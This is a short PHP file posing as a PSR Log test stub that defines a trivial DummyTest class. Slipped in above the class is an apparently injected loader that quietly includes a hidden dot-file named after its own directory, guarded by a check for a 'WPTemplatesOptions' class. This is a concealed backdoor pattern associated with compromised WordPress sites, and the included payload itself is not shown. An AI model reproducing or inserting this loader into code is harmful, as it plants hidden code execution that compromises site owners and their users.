<?php

namespace Psr\Log\Test;

/**
 * This class is internal and does not follow the BC promise.
 *
 * Do NOT use this class in any way.
 *
 * @internal
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class DummyTest
{
    public function __toString()
    {
        return 'DummyTest';
    }
}
